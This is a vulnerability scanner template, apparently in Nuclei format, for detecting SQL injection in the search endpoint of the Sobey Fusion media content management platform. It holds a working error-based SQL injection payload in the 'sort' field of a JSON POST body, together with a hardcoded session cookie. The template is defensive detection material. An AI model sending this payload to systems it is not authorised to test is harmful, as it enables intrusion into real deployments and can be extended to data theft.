id: poc-yaml-sobey-imcmp-search-sqli
info:
  name: Sobey Fusion Media Content Management Platform search SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/Sc-TaskMonitoring/rest/task/search"
    headers:
      Content-Type: application/json
      Cookie: token=5ab95532238da1b7d9eb20de7ecef90e; siteCode=S1
    body: |-
      {"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1 AND EXTRACTVALUE(8342,CONCAT(0x7e,md5({{t1}}),(SELECT (ELT(8342=8342,1))),0x716b706b71,0x7e))","desc":true}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{t2}}"
          - "java.sql.SQLException"
